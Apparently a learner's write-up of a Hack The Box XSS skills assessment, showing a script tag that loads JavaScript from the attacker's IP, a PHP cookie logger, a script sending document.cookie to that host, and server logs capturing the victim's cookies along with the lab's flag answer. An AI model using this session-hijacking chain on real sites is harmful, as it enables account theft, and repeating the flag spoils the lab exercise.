We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new `Security Blog`. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).

Start the server below, make sure you are connected to the VPN, and access the `/assessment` directory on the server using the browser:

http://SERVER_IP:PORT/assessment/

![Welcome to Security Blog. Announcement of new posts and stories from security fields, with feedback encouraged.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/103/xss_skills_assessment_website.jpg)

Apply the skills you learned in this module to achieve the following:

1. Identify a user-input field that is vulnerable to an XSS vulnerability
2. Find a working XSS payload that executes JavaScript code on the target's browser
3. Using the `Session Hijacking` techniques, try to steal the victim's cookies, which should contain the flag

Q1. What is the value of the 'flag' cookie?


![](Attachments/Pasted%20image%2020260919153153.png) 
```
the website is vuln to xss and the website field is the vulnerable area

```

```
 python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.173.24 - - [19/Sep/2026 15:30:35] code 404, message File not found
10.129.173.24 - - [19/Sep/2026 15:30:35] "GET /scrip1t.js HTTP/1.1" 404 -

step 1 

start the pyhton simple server and paste this payload.


<script src="http://10.10.14.236:8000/scrip1t.js"></script>
```


```
index.php  


<?php if (isset($_GET['c'])) { $list = explode(";", $_GET['c']); foreach ($list as $key => $value) { $cookie = urldecode($value); $file = fopen("cookies.txt", "a+"); fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n"); fclose($file); } } ?>



script.js

new Image().src='http://10.10.14.236/index.php?c='+document.cookie


payload 

<script src=http://10.10.14.236/script.js></script>


start the php server and paste the payload 


sudo php -S 0.0.0.0:80 
[Sat Sep 19 15:38:59 2026] PHP 8.4.24 Development Server (http://0.0.0.0:80) started
[Sat Sep 19 15:39:04 2026] 10.129.173.24:43822 Accepted
[Sat Sep 19 15:39:04 2026] 10.129.173.24:43822 [200]: GET /script.js
[Sat Sep 19 15:39:04 2026] 10.129.173.24:43822 Closing
[Sat Sep 19 15:39:04 2026] 10.129.173.24:43824 Accepted
[Sat Sep 19 15:39:04 2026] 10.129.173.24:43824 [200]: GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1789812564;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}       
[Sat Sep 19 15:39:04 2026] 10.129.173.24:43824 Closing

```

pretty easy isn't it?


